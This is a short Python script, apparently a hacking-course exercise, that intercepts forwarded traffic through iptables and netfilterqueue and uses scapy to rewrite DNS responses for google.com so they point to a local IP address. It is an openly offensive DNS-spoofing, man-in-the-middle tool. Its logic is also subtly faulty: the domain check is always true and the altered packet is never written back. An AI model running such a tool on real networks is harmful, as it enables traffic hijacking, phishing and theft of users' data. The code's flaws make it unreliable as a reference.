#!/usr/bin/env python

import netfilterqueue
import subprocess
import scapy.all as scapy

# set up the program's environment
subprocess.call('iptables --flush', shell=True)
subprocess.call('iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)

def process_packet(packet):
    scapy_packet=scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if 'www.google.com' or 'google.com' in qname:
            print('[+] Spoofing Target')
            answer = scapy.DNSRR(rrname=qname, rdata='192.168.1.101')
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len 
    packet.accept()

try:
    queue=netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    subprocess.call('iptables --flush', shell=True)
    print('[+] Quitting program')
